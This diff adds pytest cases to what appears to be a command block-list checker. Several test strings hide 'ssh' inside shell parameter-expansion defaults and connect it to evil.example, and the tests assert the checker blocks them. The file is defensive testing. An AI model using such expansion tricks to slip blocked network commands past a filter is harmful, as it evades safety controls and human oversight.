@@ -1194,3 +1194,21 @@ def test_unrelated_partial_remains_allowed():
         )
         is None
     )
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        'cmd=${PR10642_UNSET:-ssh}; "$cmd" -F none evil.example',
+        'cmd="${PR10642_UNSET:-ssh}"; "$cmd" -F none evil.example',
+        "cmd=${PR10642_UNSET-ssh}; $cmd -F none evil.example",
+        'cmd=${PR10642_UNSET:=ssh}; "$cmd" -F none evil.example',
+    ],
+)
+def test_expanded_command_assignment_fails_closed(command):
+    assert _find_blocked_commands(command)
+
+
+def test_parameter_expansion_as_data_remains_allowed():
+    assert not _find_blocked_commands('value=${PR10642_UNSET:-ssh}; printf "%s" "$value"')
+    assert not _find_blocked_commands("cmd='${PR10642_UNSET:-ssh}'; printf '%s' \"$cmd\"")
